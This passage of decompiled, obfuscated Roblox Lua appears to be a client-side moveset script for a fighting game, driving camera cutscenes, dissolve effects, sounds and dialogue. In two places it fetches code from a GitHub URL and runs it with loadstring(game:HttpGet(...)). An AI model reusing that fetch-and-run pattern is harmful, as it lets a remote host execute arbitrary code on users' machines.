                                    if v944 then
                                        local _dededededededededededede2, v948, v949, v950, v951, v952, v953, v954, v955, v956, v957, v958 = v944.cframe:match('([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+), ([-%d%.e]+)')

                                        _CurrentCamera2.CFrame = _CurrentCamera2.CFrame:lerp(_PrimaryPart2.CFrame * CFrame.new(tonumber(_dededededededededededede2), tonumber(v948), tonumber(v949), tonumber(v950), tonumber(v951), tonumber(v952), tonumber(v953), tonumber(v954), tonumber(v955), tonumber(v956), tonumber(v957), tonumber(v958)), 0.5)

                                        return
                                    end
                                else
                                    shared.SetCore(true)
                                    u939:Disconnect()

                                    _CurrentCamera2.CameraType = Enum.CameraType.Custom

                                    u10:Create(_CurrentCamera2, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {FieldOfView = 70}):Play()
                                end
                            end)

                            for v959 = 1, 15 do
                                local u960 = v959
                                local u961 = nil

                                u961 = v924:GetMarkerReachedSignal(tostring(u960)):Connect(function()
                                    u961:Disconnect()

                                    if u960 == 15 then
                                        task.wait(1)
                                        spawn(function()
                                            local u962 = p886
                                            local _PrimaryPart3 = u962.PrimaryPart
                                            local v964 = {}
                                            local v965, v966 = u922(game.ReplicatedStorage.Resources.DeathEffect, v964, 5)
                                            local u978 = (function(p967)
                                                local _Model = Instance.new('Model')
                                                local v969, v970, v971 = pairs(p967:GetDescendants())

                                                while true do
                                                    local v972

                                                    v971, v972 = v969(v970, v971)

                                                    if v971 == nil then
                                                        break
                                                    end
                                                    if v972:IsA('BasePart') then
                                                        local v973 = v972:Clone()
                                                        local v974, v975, v976 = pairs(v973:GetDescendants())

                                                        while true do
                                                            local v977

                                                            v976, v977 = v974(v975, v976)

                                                            if v976 == nil then
                                                                break
                                                            end
                                                            if v977:IsA('Motor6D') or v977:IsA('ParticleEmitter') or (v977:GetAttribute('Cosmetic') or v977:IsA('Weld')) or (v977:IsA('BallSocketConstraint') or v977:IsA('BillboardGui') or v977:IsA('Sound')) then
                                                                v977:Destroy()
                                                            end
                                                        end

                                                        v973.Anchored = true
                                                        v973.CollisionGroup = 'nocol'
                                                        v973.Parent = _Model

                                                        if v972.Name == 'HumanoidRootPart' then
                                                            _Model.PrimaryPart = v972
                                                        end
                                                    end
                                                end

                                                return _Model
                                            end)(u962)
                                            local v979, v980, v981 = pairs(u978:GetDescendants())

                                            while true do
                                                local v982

                                                v981, v982 = v979(v980, v981)

                                                if v981 == nil then
                                                    break
                                                end
                                                if v982:IsA('BallSocketConstraint') then
                                                    v982:Destroy()
                                                end
                                                if v982:IsA('BasePart') and v982.Name ~= 'HumanoidRootPart' then
                                                    v982.Transparency = 1
                                                    v982.Material = Enum.Material.Neon
                                                    v982.Color = Color3.fromRGB(96, 120, 255)

                                                    u10:Create(v982, TweenInfo.new(0.25, Enum.EasingStyle.Sine), {Transparency = 0}):Play()

                                                    local _SpecialMesh2 = v982:FindFirstChildOfClass('SpecialMesh')

                                                    if _SpecialMesh2 then
                                                        _SpecialMesh2.TextureId = ''
                                                        v965.Template:Clone().Parent = v982
                                                    end
                                                end
                                                if v982:IsA('Decal') then
                                                    v982.Transparency = 1
                                                end
                                            end

                                            u978.Parent = workspace.Thrown

                                            table.insert(v964, u978)
                                            u978:ScaleTo(1.05)
                                            task.spawn(function()
                                                local v984 = tick()

                                                while tick() - v984 < 0.25 and task.wait() do
                                                    local v985 = u978
                                                    local v986, v987, v988 = pairs(v985:GetDescendants())

                                                    while true do
                                                        local v989

                                                        v988, v989 = v986(v987, v988)

                                                        if v988 == nil then
                                                            break
                                                        end
                                                        if v989:IsA('BasePart') and v989.Name ~= 'HumanoidRootPart' then
                                                            local v990 = u962:FindFirstChild(v989.Name, true)

                                                            if v990 then
                                                                v989.CFrame = v990.CFrame
                                                            end
                                                        end
                                                    end
                                                end
                                            end)
                                            task.wait(0.25)

                                            local v991, v992, v993 = pairs(u962:GetDescendants())

                                            while true do
                                                local v994

                                                v993, v994 = v991(v992, v993)

                                                if v993 == nil then
                                                    break
                                                end
                                                if v994:IsA('BasePart') or v994:IsA('Decal') then
                                                    v994.Transparency = 1
                                                elseif v994:IsA('ParticleEmitter') then
                                                    v994.Enabled = false
                                                    v994.Rate = 0
                                                end
                                            end

                                            local v995, v996, v997 = pairs(u962:GetDescendants())
                                            local v998 = {
                                                -11,
                                                11,
                                            }

                                            while true do
                                                local v999

                                                v997, v999 = v995(v996, v997)

                                                if v997 == nil then
                                                    break
                                                end
                                                if v999:IsA('Motor6D') then
                                                    v999.Enabled = false
                                                end
                                            end

                                            local v1000, v1001, v1002 = pairs(u978:GetDescendants())
                                            local u1003 = {}

                                            while true do
                                                local v1004

                                                v1002, v1004 = v1000(v1001, v1002)

                                                if v1002 == nil then
                                                    break
                                                end
                                                if v1004:IsA('BasePart') and v1004.Name ~= 'HumanoidRootPart' then
                                                    local _CFrame5 = v1004.CFrame
                                                    local v1006 = v998[1]
                                                    local v1007 = v998[2]
                                                    local v1008 = Random.new()
                                                    local v1009

                                                    if v1007 or not v1006 then
                                                        v1009 = v1006
                                                        v1006 = v1007
                                                    else
                                                        v1009 = 1
                                                    end
                                                    if not (v1006 or v1009) then
                                                        v1009 = 0
                                                        v1006 = 1
                                                    end

                                                    local v1010 = v1008:NextNumber(v1009, v1006)
                                                    local v1011 = 0
                                                    local v1012 = v998[2] / 2
                                                    local v1013 = Random.new()
                                                    local v1014

                                                    if v1012 or not v1011 then
                                                        v1014 = v1011
                                                        v1011 = v1012
                                                    else
                                                        v1014 = 1
                                                    end
                                                    if not (v1011 or v1014) then
                                                        v1014 = 0
                                                        v1011 = 1
                                                    end

                                                    u1003[v1004] = _CFrame5 * CFrame.new(v1010, v1013:NextNumber(v1014, v1011), u405(v998[1], v998[2])) * CFrame.Angles(math.rad((math.random(0, 360))), math.rad((math.random(0, 360))), (math.rad((math.random(0, 360)))))
                                                end
                                            end

                                            local v1015, v1016, v1017 = pairs(u1003)

                                            while true do
                                                local v1018

                                                v1017, v1018 = v1015(v1016, v1017)

                                                if v1017 == nil then
                                                    break
                                                end

                                                local _SpecialMesh3 = v1017:FindFirstChildOfClass('SpecialMesh')
                                                local v1020 = 1
                                                local v1021 = 2
                                                local v1022 = Random.new()
                                                local v1023

                                                if v1021 or not v1020 then
                                                    v1023 = v1020
                                                    v1020 = v1021
                                                else
                                                    v1023 = 1
                                                end
                                                if not (v1020 or v1023) then
                                                    v1023 = 0
                                                    v1020 = 1
                                                end

                                                local v1024 = v1022:NextNumber(v1023, v1020)

                                                if _SpecialMesh3 then
                                                    u10:Create(_SpecialMesh3, TweenInfo.new(v1024, Enum.EasingStyle.Exponential), {
                                                        Scale = Vector3.new(0, 0, 0, 0),
                                                    }):Play()
                                                else
                                                    u10:Create(v1017, TweenInfo.new(v1024, Enum.EasingStyle.Exponential), {
                                                        Size = Vector3.new(0, 0, 0, 0),
                                                    }):Play()
                                                end

                                                u6:AddItem(v1017, v1024)
                                            end

                                            local v1025 = v966._maid:give(v965.Brother:Clone())

                                            v1025:SetPrimaryPartCFrame(_PrimaryPart3.CFrame)
                                            v1025:ScaleTo(0.5)

                                            v1025.Parent = workspace.Thrown

                                            u902(v1025)
                                            task.spawn(function()
                                                local v1026 = tick()

                                                while tick() - v1026 < 3 do
                                                    local v1027, v1028, v1029 = pairs(u1003)

                                                    while true do
                                                        local v1030

                                                        v1029, v1030 = v1027(v1028, v1029)

                                                        if v1029 == nil then
                                                            break
                                                        end

                                                        v1029.CFrame = v1029.CFrame:Lerp(v1030, 0.1)
                                                    end

                                                    u12.Heartbeat:Wait()
                                                end
                                            end)
                                        end)
                                        task.wait(0.35)

                                        local v1031 = p886
                                        local v1032, v1033, v1034 = pairs(v1031:GetDescendants())

                                        while true do
                                            local v1035

                                            v1034, v1035 = v1032(v1033, v1034)

                                            if v1034 == nil then
                                                break
                                            end
                                            if v1035:IsA('BasePart') or v1035:IsA('Decal') then
                                                v1035.Transparency = 1
                                            elseif v1035:IsA('BillboardGui') then
                                                v1035:Destroy()
                                            elseif v1035:IsA('ParticleEmitter') then
                                                v1035.Enabled = false
                                            end
                                        end

                                        p886.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
                                        wait(1)
                                        u131()
                                    end
                                end)
                            end

                            local u1036 = nil

                            u1036 = v924:GetMarkerReachedSignal('teleport'):Connect(function()
                                u1036:Disconnect()

                                local v1037 = u4.Resources.NinjaUlt.Afterimage_Line.Main.Afterimage_Flip_Black:Clone()

                                v1037.Parent = p887.Head

                                local v1038 = u4.Resources.NinjaUlt.Start_Effects.Particles.Low.Silhouette:Clone()

                                v1038.Parent = p887.Head

                                u6:AddItem(v1037, 1)
                                u6:AddItem(v1038, 1)
                                v1037:Emit(1)
                                v1038:Emit(1)

                                local v1039 = p887
                                local v1040, v1041, v1042 = pairs(v1039:GetDescendants())

                                while true do
                                    local u1043

                                    v1042, u1043 = v1040(v1041, v1042)

                                    if v1042 == nil then
                                        break
                                    end
                                    if u1043:IsA('BasePart') or u1043:IsA('Decal') then
                                        local _Transparency = u1043.Transparency

                                        u1043.Transparency = 1

                                        task.delay(3, function()
                                            u1043.Transparency = _Transparency
                                        end)
                                    elseif u1043:IsA('BillboardGui') and u1043.Enabled then
                                        u1043.Enabled = false

                                        task.delay(3, function()
                                            u1043.Enabled = true
                                        end)
                                    elseif u1043:IsA('ParticleEmitter') and u1043.Enabled then
                                        u1043.Enabled = false

                                        task.delay(3, function()
                                            u1043.Enabled = true
                                        end)
                                    end
                                end

                                local _Sound6 = Instance.new('Sound')

                                _Sound6.Parent = p887.Torso
                                _Sound6.SoundId = 'rbxassetid://4826619573'
                                _Sound6.Volume = 2
                                _Sound6.TimePosition = 0.5

                                local v1046 = _Sound6

                                _Sound6.Play(v1046)

                                local u1047 = nil

                                u1047 = _Sound6.Ended:Connect(function()
                                    if _Sound6 then
                                        _Sound6:Destroy()
                                    end

                                    return u1047:Disconnect()
                                end)
                            end)

                            v924.Stopped:Wait()

                            return true
                        end
                        local function u1071(p1049)
                            local u1050 = p1049 or _LocalPlayer3.Character
                            local v1051 = u1050
                            local _Animator = u1050.WaitForChild(v1051, 'Humanoid'):WaitForChild('Animator')
                            local _Sound7 = Instance.new('Sound')

                            _Sound7.Volume = 1
                            _Sound7.Parent = _LocalPlayer3.Character.Torso
                            _Sound7.SoundId = 'rbxassetid://17325174223'

                            _Sound7:Play()

                            local _Animation5 = Instance.new('Animation')

                            _Animation5.AnimationId = 'rbxassetid://17325160621'

                            local u1055 = _Animator:LoadAnimation(_Animation5)

                            u1055.Priority = Enum.AnimationPriority.Action4

                            local v1056 = u1055

                            u1055.Play(v1056)

                            local v1057 = u1055

                            u1055.AdjustSpeed(v1057, 1)

                            local u1058 = u4.Resources['le phone']:Clone()
                            local v1059 = u1058
                            local u1060 = u1058.WaitForChild(v1059, 'Handle')
                            local v1061 = u1050

                            u1060.Handle.Part0 = u1050.WaitForChild(v1061, 'Right Arm', 1)
                            u1060.Handle.Part1 = u1058.Handle
                            u1060.Transparency = 1
                            u1058.Parent = u201()

                            local _Sound8 = Instance.new('Sound')

                            _Sound8.SoundId = 'rbxassetid://17325206534'
                            _Sound8.Volume = 1
                            _Sound8.Parent = u1060

                            local v1063 = _Sound8

                            _Sound8.Play(v1063)

                            local function u1064()
                                if u1058 and u1058.Parent then
                                    u1058:Destroy()
                                end

                                u1055:Stop()
                            end

                            u1055.Stopped:Connect(function()
                                if u1058 then
                                    u1064()
                                end
                            end)
                            u1050.Humanoid.Changed:Connect(function()
                                if u1058 and (u1050 and u1050.Parent) and (u1050.Humanoid and 0.4 <= u1050.Humanoid.MoveDirection.Magnitude) then
                                    u1064()
                                end
                            end)
                            u6:AddItem(u1058, 7)
                            task.delay(1.6, function()
                                if u1055.IsPlaying then
                                    local v1065 = u1060
                                    local v1066, v1067, v1068 = pairs(v1065:GetChildren())

                                    while true do
                                        local v1069

                                        v1068, v1069 = v1066(v1067, v1068)

                                        if v1068 == nil then
                                            break
                                        end
                                        if v1069:IsA('Motor6D') then
                                            v1069:Destroy()
                                        end
                                    end

                                    task.delay(0.2, function()
                                        local v1070 = _Sound8:Clone()

                                        v1070.SoundId = 'rbxassetid://17325211957'
                                        v1070.Parent = u1060
                                        v1070.Volume = 1

                                        v1070:Play()
                                        wait(0.1)
                                        _Sound8:Destroy()
                                    end)
                                end
                            end)
                        end
                        local function u1076(p1072, p1073, p1074)
                            local v1075 = u194 or loadstring(game:HttpGet('https://raw.githubusercontent.com/Tariviste/wehatepastebin/refs/heads/main/TekrinnDialogue'))()

                            if not u194 then
                                u194 = v1075
                            end

                            v1075.Speak(nil, {
                                {
                                    Text = p1072,
                                    Color = ColorSequence.new({
                                        ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
                                        ColorSequenceKeypoint.new(0.5, _G.JKMode and Color3.fromRGB(50, 62, 168) or Color3.fromRGB(255, 17, 17)),
                                        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
                                    }),
                                    TextStrokeColor = Color3.new(0, 0, 0),
                                    Bold = p1074,
                                    Italic = false,
                                    Shake = {
                                        Intensity = 1,
                                        Lifetime = 2,
                                    },
                                    TypeSpeed = p1073,
                                    HigherUp = true,
                                },
                            })
                        end

                        local u1077 = {
                            Ravage = {
                                Startup = 'rbxassetid://16945573694',
                                Attacker = 'rbxassetid://16945550029',
                                Victim = 'rbxassetid://16945557433',
                            },
                            UFW = 'rbxassetid://77727115892579',
                            FiveSeasons = {
                                Startup = 'rbxassetid://18462892217',
                                Ready = 'rbxassetid://18462894593',
                            },
                            Dropkick = {
                                Startup = 'rbxassetid://17354976067',
                                Attacker = 'rbxassetid://17420452843',
                                Victim = 'rbxassetid://17363256069',
                            },
                            StoicBomb = 'rbxassetid://17141153099',
                            SwiftSweep = {
                                Startup = 'rbxassetid://16944265635',
                                Attacker = 'rbxassetid://16944345619',
                            },
                            CollateralRuin = 'rbxassetid://17325254223',
                            SpiralingStorm = {
                                Startup = 'rbxassetid://70512853043908',
                                Attacker = 'rbxassetid://81827172076105',
                                Victim = 'rbxassetid://116005409979614',
                            },
                        }

                        local function u1084(p1078, p1079)
                            local v1080, v1081, v1082 = pairs(p1078)

                            while true do
                                local v1083

                                v1082, v1083 = v1080(v1081, v1082)

                                if v1082 == nil then
                                    break
                                end
                                if typeof(v1083) ~= 'table' then
                                    if typeof(v1083) == 'string' and string.find(v1083, 'rbxassetid://') then
                                        table.insert(p1079, v1083)
                                    end
                                else
                                    u1084(v1083, p1079)
                                end
                            end
                        end

                        local u1085 = {}

                        u1084(u1077, u1085)
                        task.spawn(function()
                            game:GetService('ContentProvider'):PreloadAsync(u1085)
                        end)

                        local function u1654(p1086, p1087)
                            local v1088 = u194 or loadstring(game:HttpGet('https://raw.githubusercontent.com/Tariviste/wehatepastebin/refs/heads/main/TekrinnDialogue'))()

                            if not u194 then
                                u194 = v1088
                            end

                            local _Folder3 = Instance.new('Folder')

                            _Folder3.Name = 'NoRotate'
                            _Folder3.Parent = u201()

                            u122()

                            local v1090 = u201(p1086)

                            u251()

                            if p1087 then
                                shared.SetCore(false)

                                local _BodyVelocity5 = Instance.new('BodyVelocity')
                                local v1092 = Vector3.new()

                                _BodyVelocity5.MaxForce = Vector3.new(9000000000, 9000000000, 9000000000)
                                _BodyVelocity5.Velocity = v1092
                                _BodyVelocity5.Parent = _LocalPlayer3.Character.HumanoidRootPart
                                _LocalPlayer3.Character.HumanoidRootPart.CFrame = p1086.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -15)

                                task.delay(25.78, function()
                                    _BodyVelocity5:Destroy()

                                    for _ = 1, 100 do
                                        _LocalPlayer3.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
                                    end
                                end)
                            end

                            u763({
                                Position = p1086.Character.PrimaryPart.Position,
                                Blacklist = {},
                                Radius = 40,
                                TotalParts = 110,
                            })

                            local u1093 = 'rbxassetid://95410275491981'
                            local u1094 = false

                            pcall(function()
                                if u26 and (u27('GodOnlyKnowsFlexWorks2.mp3') and u34) then
                                    u1094 = true
                                    u1093 = u26('GodOnlyKnowsFlexWorks2.mp3')
                                end
                            end)

                            local u1095 = shared.sfx({
                                SoundId = u1093,
                                Volume = 6,
                                Parent = workspace,
                            })

                            if u1094 then
                                task.delay(16, function()
                                    local v1096 = tick()
                                    local _Volume = u1095.Volume
                                    local v1098 = _Volume / 2

                                    while tick() - v1096 < 0.5 do
                                        local v1099 = tick() - v1096

                                        u1095.Volume = _Volume + (v1098 - _Volume) * (v1099 / 0.5)

                                        wait(0.03)
                                    end

                                    u1095.Volume = v1098
                                end)
                                task.delay(22.5, function()
                                    local v1100 = tick()
                                    local _Volume2 = u1095.Volume
                                    local v1102 = _Volume2 * 2

                                    while tick() - v1100 < 0.5 do
                                        local v1103 = tick() - v1100

                                        u1095.Volume = _Volume2 + (v1102 - _Volume2) * (v1103 / 0.5)

                                        wait(0.03)
                                    end

                                    u1095.Volume = v1102
                                end)
                                task.delay(26.78, function()
                                    local v1104 = tick()
                                    local _Volume3 = u1095.Volume
                                    local v1106 = 7.5

                                    while tick() - v1104 < 0.5 do
                                        local v1107 = tick() - v1104

                                        u1095.Volume = _Volume3 + (v1106 - _Volume3) * (v1107 / 0.5)

                                        wait(0.03)
                                    end

                                    u1095.Volume = v1106
                                end)
                            end

                            shared.sfx({
                                SoundId = 'rbxassetid://99126314241685',
                                Volume = 6,
                                Parent = workspace,
                            })
                            shared.sfx({
                                SoundId = 'rbxassetid://128136381213631',
                                Volume = 7,
                                Parent = workspace,
                            })

                            local u1108 = game:GetObjects('rbxassetid://75372841042621')[1]

                            u1108:PivotTo(CFrame.new(71521.266, -4.926, -69.202))

                            local u1109 = u1108

                            u1108.Name = 'STUPID RIG THING'
                            u1108.Parent = workspace.Thrown

                            local function u1125(p1110)
                                local v1111 = game:GetService('Players'):GetCharacterAppearanceAsync(game:GetService('Players'):GetUserIdFromNameAsync(p1086.Name))
                                local v1112, v1113, v1114 = pairs(p1110:GetChildren())

                                while true do
                                    local v1115

                                    v1114, v1115 = v1112(v1113, v1114)

                                    if v1114 == nil then
                                        break
                                    end
                                    if v1115:IsA('Accessory') or v1115:IsA('Shirt') or (v1115:IsA('Pants') or v1115:IsA('CharacterMesh')) or (v1115:IsA('BodyColors') or v1115:IsA('ShirtGraphic')) then
                                        v1115:Destroy()
                                    end
                                end

                                local v1116, v1117, v1118 = pairs(p1110.Head:GetChildren())

                                while true do
                                    local v1119

                                    v1118, v1119 = v1116(v1117, v1118)

                                    if v1118 == nil then
                                        break
                                    end
                                    if v1119:IsA('SpecialMesh') and v1119:GetAttribute('FromMorph') == true then
                                        v1119:Destroy()
                                    end
                                end

                                if p1110.Head:FindFirstChild('face') then
                                    p1110.Head.face:Destroy()
                                end

                                local v1120, v1121, v1122 = pairs(v1111:GetChildren())

                                while true do
                                    local v1123

                                    v1122, v1123 = v1120(v1121, v1122)

                                    if v1122 == nil then
                                        break
                                    end
                                    if v1123:IsA('Shirt') or v1123:IsA('Pants') or (v1123:IsA('BodyColors') or v1123:IsA('ShirtGraphic')) then
                                        v1123.Parent = p1110
                                    elseif v1123:IsA('Accessory') then
                                        v1123.Name = '#ACCESSORY_' .. v1123.Name
                                        v1123.Parent = p1110
                                    elseif v1123:IsA('SpecialMesh') then
                                        v1123:SetAttribute('FromMorph', true)

                                        v1123.Parent = p1110.Head
                                    elseif v1123.Name ~= 'R6' then
                                        if v1123.Name == 'R15' and p1110.Humanoid.RigType == Enum.HumanoidRigType.R15 then
                                            v1123:FindFirstChildOfClass('CharacterMesh').Parent = p1110
                                        end
                                    elseif p1110.Humanoid.RigType == Enum.HumanoidRigType.R6 then
                                        v1123:FindFirstChildOfClass('CharacterMesh').Parent = p1110
                                    end
                                end

                                if v1111:FindFirstChild('face') then
                                    v1111.face.Parent = p1110.Head
                                else
                                    local _Decal = Instance.new('Decal')

                                    _Decal.Face = 'Front'
                                    _Decal.Name = 'face'
                                    _Decal.Texture = 'rbxasset://textures/face.png'
                                    _Decal.Transparency = 0
                                    _Decal.Parent = p1110.Head
                                end

                                p1110.Parent = nil
                                p1110.Parent = u1109
                            end

                            local v1126, v1127, v1128 = pairs(u1108:GetChildren())

                            while true do
                                local u1129

                                v1128, u1129 = v1126(v1127, v1128)

                                if v1128 == nil then
                                    break
                                end
                                if u1129:IsA('Model') then
                                    spawn(function()
                                        u1125(u1129)
                                    end)
                                end
                            end

                            local v1130 = u706(u1077.UFW, (p1087 == nil or not p1087) and true or p1087, p1086)

                            v1130.Stopped:Connect(u131)

                            u113(p1086).Anchored = true

                            task.delay(29, function()
                                u113(p1086).Anchored = false
                            end)

                            local v1131 = game.ReplicatedStorage.Resources.UFW.RB:Clone()

                            v1131:SetPrimaryPartCFrame(CFrame.new(1000000, 1000000, 1000000))

                            v1131.Parent = workspace.Thrown

                            v1131:ScaleTo(7)

                            local v1132 = v1131.AnimationController:LoadAnimation(game.ReplicatedStorage.Resources.UFW.lastthing)

                            v1132:Play()

                            v1132.TimePosition = 1.4

                            game.Debris:AddItem(v1131, 3)

                            local _Part6 = Instance.new('Part')

                            _Part6.Anchored = true
                            _Part6.Transparency = 1
                            _Part6.CanCollide = false
                            _Part6.CanQuery = false
                            _Part6.CanTouch = false
                            _Part6.CFrame = CFrame.new(40000, 40000, 40000)
                            _Part6.Parent = workspace.Thrown

                            game.Debris:AddItem(_Part6, 10)

                            local u1134 = _Part6

                            spawn(function()
                                local v1135, v1136, v1137 = pairs(game.ReplicatedStorage.Resources.UFW.vfx.Pillar.Preload:GetDescendants())
                                local v1138 = {}

                                while true do
                                    local v1139

                                    v1137, v1139 = v1135(v1136, v1137)

                                    if v1137 == nil then
                                        break
                                    end
                                    if v1139:IsA('Decal') and v1139.Texture ~= '' and not table.find(v1138, v1139.Texture) then
                                        table.insert(v1138, v1139.Texture)
                                    end
                                end

                                local v1140, v1141, v1142 = pairs(v1138)

                                while true do
                                    local v1143

                                    v1142, v1143 = v1140(v1141, v1142)

                                    if v1142 == nil then
                                        break
                                    end

                                    local _Decal2 = Instance.new('Decal')

                                    _Decal2.Parent = u1134

                                    game.Debris:AddItem(_Decal2, 3)

                                    _Decal2.Texture = v1143

                                    task.wait(0.0065)
                                end
                            end)

                            local _Accessory = Instance.new('Accessory')

                            _Accessory.Name = 'HideUlt'

                            _Accessory:SetAttribute('Force', true)

                            _Accessory.Parent = u201(p1086)

                            game.Debris:AddItem(_Accessory, 28)

                            local _UFW = game.ReplicatedStorage.Resources.UFW
                            local v1147 = u12
                            local v1148 = _LocalPlayer3
                            local v1149 = {}
                            local _JKMode = _G.JKMode
                            local v1151 = Color3.fromRGB(255, 17, 17)

                            if _JKMode then
                                v1151 = Color3.fromRGB(50, 62, 168)
                            end

                            local v1152 = Color3.fromRGB(255, 17, 17)

                            if _JKMode then
                                v1152 = Color3.fromRGB(50, 62, 168)
                            end

                            local v1153 = Color3.fromRGB(255, 0, 0)

                            if _JKMode then
                                v1153 = Color3.fromRGB(50, 62, 168)
                            end

                            local v1154 = {
                                {
                                    {
                                        Text = 'Because with this... ',
                                        Color = ColorSequence.new({
                                            ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
                                            ColorSequenceKeypoint.new(0.5, v1151),
                                            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
                                        }),
                                        TextStrokeColor = Color3.new(0, 0, 0),
                                        Bold = false,
                                        Italic = false,
                                        Shake = {
                                            Enabled = false,
                                            Intensity = 1,
                                            Lifetime = 2,
                                        },
                                        TypeSpeed = 0.06,
                                    },
                                    {
                                        Text = "IT'S OVER!",
                                        Color = ColorSequence.new({
                                            ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
                                            ColorSequenceKeypoint.new(1, v1151),
                                        }),
                                        TextStrokeColor = Color3.new(0, 0, 0),
                                        Bold = true,
                                        Italic = true,
                                        Shake = {
                                            Enabled = true,
                                            Intensity = 5,
                                            Lifetime = 1,
                                        },
                                        TypeSpeed = 0.06,
                                    },
                                },
                                {
                                    {
                                        Text = "KJ's... ",
                                        Color = ColorSequence.new({
                                            ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
                                            ColorSequenceKeypoint.new(0.5, v1153),
                                            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
                                        }),
                                        TextStrokeColor = Color3.new(0, 0, 0),
                                        Bold = false,
                                        Italic = false,
                                        Shake = {
                                            Enabled = false,
                                            Intensity = 1,
                                            Lifetime = 2,
                                        },
                                        TypeSpeed = 0.07,
                                    },
                                    {
                                        Text = '21 SERIES.',
                                        Color = ColorSequence.new({
                                            ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 0)),
                                            ColorSequenceKeypoint.new(0.2, v1152),
                                            ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 255, 127)),
                                            ColorSequenceKeypoint.new(0.6, Color3.fromRGB(85, 170, 255)),
                                            ColorSequenceKeypoint.new(0.8, Color3.fromRGB(255, 0, 255)),
                                            ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
                                        }),
                                        TextStrokeColor = v1152,
                                        Bold = true,
                                        Italic = true,
                                        Shake = {
                                            Enabled = true,
                                            Intensity = 4,
                                            Lifetime = 1,
                                        },
                                        TypeSpeed = 0.08,
                                    },
                                },
                            }

                            local function v1164(p1155, p1156, p1157, _)
                                local u1158 = p1156
                                local u1159 = p1156 - 1
                                local u1160 = true
                                local u1163 = shared.loop(function()
                                    if u1160 and p1157 >= u1158 then
                                        local v1161 = p1155:FindFirstChild((tostring(u1159)))

                                        if v1161 then
                                            v1161.ImageTransparency = 1
                                        end

                                        local v1162 = p1155:FindFirstChild((tostring(u1158)))

                                        if v1162 then
                                            v1162.ImageTransparency = 0
                                            v1162.Size = UDim2.new(1, 0, 1, 0)
                                        end

                                        u1159 = u1158
                                        u1158 = u1158 + 1
                                    else
                                        if p1155:FindFirstChild(p1157) then
                                            p1155[p1157].ImageTransparency = 1
                                        end

                                        u1160 = false
                                    end
                                end, 34)

                                task.delay(5, function()
                                    if u1163 then
                                        u1163()
                                    end
                                end)
                            end

                            local _RootPart = v1090:FindFirstChild('Humanoid').RootPart
                            local v1166 = _UFW.CamRigWithLetterBox:Clone()

                            table.insert(v1149, v1166)

                            local _RootPart2 = v1166.RootPart

                            _RootPart2.CFrame = _RootPart2.CFrame * CFrame.new(0, 0, 1000000)
                            v1166.Parent = workspace

                            local v1168 = v1166.AnimationController.Animator:LoadAnimation(_UFW.Camera)

                            v1168:Play()

                            local u1169 = v1168

                            v1130.Stopped:Connect(function()
                                u1169:Stop()

                                workspace.CurrentCamera.CameraType = Enum.CameraType.Custom
                            end)

                            local u1170 = _UFW.ImpactFrames:Clone()

                            u1170.Parent = v1148.PlayerGui

                            local v1171, v1172, v1173 = pairs(u1170:GetChildren())

                            while true do
                                local v1174

                                v1173, v1174 = v1171(v1172, v1173)

                                if v1173 == nil then
                                    break
                                end

                                v1174.Size = UDim2.new(0, 0, 0, 1)
                                v1174.ImageTransparency = 0
                            end

                            local v1175, v1176, v1177 = pairs(_UFW.Flexworks:GetChildren())

                            while true do
                                local v1178, v1179 = v1175(v1176, v1177)

                                if v1178 == nil then
                                    break
                                end

                                v1177 = v1178

                                local u1180 = v1179:Clone()

                                u1180.Size = UDim2.new(0, 0, 0, 1)
                                u1180.Position = UDim2.new(0, 0, 0, 0)
                                u1180.Parent = u1170

                                task.delay(2, function()
                                    u1180:Destroy()
                                end)
                            end

                            local u1181 = _UFW
                            local u1182 = v1148
                            local u1183 = v1090
                            local u1184 = v1147
                            local u1185 = v1166
                            local u1186 = _RootPart
                            local u1187 = v1164
                            local u1188 = nil
                            local u1189 = nil

                            task.spawn(function()
                                local u1190 = u1181.Flash:Clone()
                                local _Viewport = u1190.Flashup.Viewport.Viewport
                                local _Camera = Instance.new('Camera', _Viewport)

                                _Viewport.CurrentCamera = _Camera
                                u1190.Parent = u1182.PlayerGui
                                u1183.Archivable = true
                                u1188 = u1183:Clone()
                                u1188.PrimaryPart.Anchored = true

                                local v1193 = u1188
                                local v1194, v1195, v1196 = pairs(v1193:GetDescendants())

                                while true do
                                    local v1197

                                    v1196, v1197 = v1194(v1195, v1196)

                                    if v1196 == nil then
                                        break
                                    end
                                    if v1197.ClassName:find('Script') then
                                        v1197:Destroy()
                                    end
                                end

                                local v1198 = u1188
                                local v1199, v1200, v1201 = pairs(v1198:GetChildren())

                                while true do
                                    local v1202

                                    v1201, v1202 = v1199(v1200, v1201)

                                    if v1201 == nil then
                                        break
                                    end
                                    if v1202:IsA('BasePart') then
                                        v1202.Anchored = true
                                    end
                                end

                                local v1203 = u1188
                                local v1204, v1205, v1206 = pairs(v1203:GetDescendants())

                                while true do
                                    local v1207

                                    v1206, v1207 = v1204(v1205, v1206)

                                    if v1206 == nil then
                                        break
                                    end
                                    if v1207:IsA('Highlight') then
                                        v1207:Destroy('')
                                    end
                                end

                                u1188.Parent = _Viewport.Body
                                u1189 = u1188.Humanoid:LoadAnimation(u1181.User)

                                local v1215 = u1184.RenderStepped:Connect(function()
                                    u1185.RootPart.CFrame = u1186.CFrame * CFrame.new(0, -3, 0) * CFrame.Angles(0, 3.141592653589793, 0)
                                    _Camera.CFrame = u1185.camera.CFrame

                                    local v1208 = u1188
                                    local v1209, v1210, v1211 = pairs(v1208:GetChildren())

                                    while true do
                                        local v1212

                                        v1211, v1212 = v1209(v1210, v1211)

                                        if v1211 == nil then
                                            break
